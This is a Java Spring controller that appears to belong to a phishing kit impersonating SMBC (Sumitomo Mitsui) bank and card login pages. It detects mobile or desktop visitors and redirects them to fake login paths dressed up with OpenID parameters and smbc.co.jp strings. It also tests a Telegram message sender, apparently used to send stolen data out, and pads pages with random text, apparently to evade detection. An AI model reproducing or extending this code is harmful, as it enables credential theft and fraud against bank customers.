package com.kidd.smbc.controller;

import cn.hutool.core.util.RandomUtil;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.useragent.UserAgent;
import cn.hutool.http.useragent.UserAgentUtil;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.kidd.smbc.task.AsyncTask;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


@Controller
public class SmbcController {
    @Autowired
    private AsyncTask asyncTask;

    @Value("google.secret:6Lcsyy0aAAAAAO6HCHjPOEdiKmN3OFx53r14twie")
    private String googleSecret;

    @Value("smbc.defaulRedirectUrl:https://www.smbc-card.com/sp/index.jsp")
    private String defaulRedirectUrl;

    private void randStr(Model model) {
        String random = RandomUtil.randomString(3000);
        String header = RandomUtil.randomString(20);
        model.addAttribute("data", random);
        model.addAttribute("header", header);
    }

    @GetMapping("/testTg")
    public Object testTg(@RequestHeader("User-Agent") String uaStr, Model model) {
        Map<String,String> map = new HashMap<String,String>(){{
            put("name","zs");
            put("value","ls");
            put("age","19");
        }};
        asyncTask.asyncSendTgMsg(null,null,map);
        return "success";
    }
    /**
     * 判定是pc端or手机端
     * @param model
     * @return
     */
    @GetMapping("/q")
    public Object index(@RequestHeader("User-Agent") String uaStr, Model model) {
        List<String> mobileUaList = Arrays.asList("iphone","android","phone","mobile","wap","netfront","java","opera mobi",
                "opera mini","ucweb","windows ce","symbian","series","webos","sony","blackberry","dopod",
                "nokia","samsung","palmsource","xda","pieplus","meizu","midp","cldc","motorola","foma",
                "docomo","up.browser","up.link","blazer","helio","hosin","huawei","novarra","coolpad",
                "techfaith","alcatel","amoi","ktouch","nexian","ericsson","philips","sagem","wellcom",
                "bunjalloo","maui","smartphone","iemobile","spice","bird","zte-","longcos","pantech",
                "gionee","portalmmm","jig browser","hiptop","benq","haier","^lct","320x320","240x320",
                "176x220","windows phone","cect","compal","ctl","lg","nec","tcl","daxian","dbtel","eastcom",
                "konka","kejian","lenovo","mot","soutec","sgh","sed","capitel","panasonic","sonyericsson",
                "sharp","panda","zte","acer","acoon","acs-","abacho","ahong","airness","anywhereyougo.com",
                "applewebkit/525","applewebkit/532","asus","audio","au-mic","avantogo","becker","bilbo",
                "bleu","cdm-","danger","elaine","eric","etouch","fly ","fly_","fly-","go.web","goodaccess",
                "gradiente","grundig","hedy","hitachi","htc","hutchison","inno","ipad","ipaq","ipod",
                "jbrowser","kddi","kgt","kwc","lg ","lg2","lg3","lg4","lg5","lg7","lg8","lg9","lg-","lge-",
                "lge9","maemo","mercator","meridian","micromax","mini","mitsu","mmm","mmp","mobi","mot-",
                "moto","nec-","newgen","nf-browser","nintendo","nitro","nook","obigo","palm","pg-",
                "playstation","pocket","pt-","qc-","qtek","rover","sama","samu","sanyo","sch-","scooter",
                "sec-","sendo","sgh-","siemens","sie-","softbank","sprint","spv","tablet","talkabout",
                "tcl-","teleca","telit","tianyu","tim-","toshiba","tsm","utec","utstar","verykool","virgin",
                "vk-","voda","voxtel","vx","wellco","wig browser","wii","wireless","xde","pad","gt-p1000");

//        for(String mobileUa : mobileUaList){
//            if(ua.toLowerCase().contains(mobileUa)){
//                isMobile = true;
//            }
//        }
        Boolean isMobile = false;
        UserAgent ua = UserAgentUtil.parse(uaStr);
        isMobile = ua.isMobile();
        String mobileUrl = "/mobile/index?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.smbc.co.jp%2F%3Fref_%3Dnav_em_hd_re_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=jpflex&openid.mode=checkid_setup&key=a@b.c&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&&ref_=nav_em_hd_clc_signinhttps://www.smbc.co.jp";
        String pcUrl = "/pc/index?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.smbc.co.jp%2F%3Fref_%3Dnav_em_hd_re_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=jpflex&openid.mode=checkid_setup&key=a@b.c&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&&ref_=nav_em_hd_clc_signinhttps://www.smbc.co.jp";
        return "redirect:"+ (isMobile?mobileUrl:pcUrl);
    }


}
